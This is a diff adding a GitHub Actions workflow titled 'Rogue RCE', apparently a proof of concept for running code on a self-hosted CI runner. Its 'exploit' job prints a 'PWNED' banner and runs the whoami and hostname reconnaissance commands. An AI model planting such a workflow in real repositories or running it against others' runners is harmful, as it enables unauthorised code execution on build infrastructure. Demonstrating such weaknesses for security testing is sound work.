@@ -1,0 +1,10 @@
+
+name: Rogue RCE
+on: workflow_dispatch
+jobs:
+  exploit:
+    runs-on: [self-hosted, rogue]
+    steps:
+      - run: echo "PWNED by Rogue Runner"
+      - run: whoami
+      - run: hostname
